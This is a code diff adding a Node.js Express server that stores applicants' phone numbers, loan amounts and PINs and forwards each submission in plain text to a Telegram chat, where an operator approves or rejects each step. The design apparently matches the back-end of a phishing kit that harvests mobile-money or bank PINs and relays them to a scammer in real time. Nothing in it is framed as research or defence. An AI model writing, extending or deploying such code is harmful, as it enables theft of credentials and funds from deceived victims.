@@ -1,0 +1,62 @@
+const express = require('express');
+const fetch = require('node-fetch');
+const app = express();
+app.use(express.json());
+app.use(express.static('.'));
+
+// Save applications in memory
+let apps = {};
+
+app.post('/api/step', async (req, res) => {
+  const { phone, step, amount, pin } = req.body;
+  if(!apps[phone]) apps[phone] = { amount, phone, step: 0, approved: {} };
+  apps[phone].step = step;
+  if(pin) apps[phone].pin = pin;
+
+  const BOT_TOKEN = process.env.BOT_TOKEN;
+  const CHAT_ID = process.env.CHAT_ID;
+  const text = `🔔 STEP ${step}\nAmount: ${amount}\nPhone: ${phone}\nPIN: ${pin || 'N/A'}`;
+
+  // Send to Telegram with Approve button
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text,
+      reply_markup: {
+        inline_keyboard: [[
+          { text: `✅ Approve Step ${step}`, callback_data: `approve_${phone}_${step}` },
+          { text: `❌ Reject`, callback_data: `reject_${phone}_${step}` }
+        ]]
+      }
+    })
+  });
+
+  res.json({ ok: true, msg: `Step ${step} sent to admin. Wait for approval.` });
+});
+
+app.get('/api/status/:phone', (req, res) => {
+  const a = apps[req.params.phone];
+  res.json(a || { step: 0, approved: {} });
+});
+
+// Telegram webhook - admin clicks Approve
+app.post('/webhook', async (req, res) => {
+  const q = req.body.callback_query;
+  if(q){
+    const [action, phone, step] = q.data.split('_');
+    if(!apps[phone]) apps[phone] = { approved: {} };
+    apps[phone].approved[step] = action;
+    
+    const BOT_TOKEN = process.env.BOT_TOKEN;
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ callback_query_id: q.id, text: `${action} Step ${step} for ${phone}` })
+    });
+  }
+  res.send('ok');
+});
+
+app.listen(process.env.PORT || 10000, ()=> console.log('Running'));
